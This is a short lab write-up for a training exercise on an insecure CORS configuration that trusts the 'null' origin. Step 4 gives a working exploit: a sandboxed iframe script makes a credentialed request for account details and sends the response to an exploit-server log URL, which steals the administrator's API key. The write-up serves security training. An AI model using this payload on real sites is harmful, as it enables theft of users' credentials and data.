### Lab description

This website has an insecure CORS configuration in that it trusts the "null" origin.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`

#### Lab solution

1. Login with `wiener`
2. Go to `/accountDetails` endpoint
3. If you add `Origin` header with `null` value, the app will reflect

4. To create `null` Origin you need to create the follow HTML code inside the exploit server:

```html
`<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText); }; </script>"></iframe>`

```
5. Store and click on send the payload to the victim
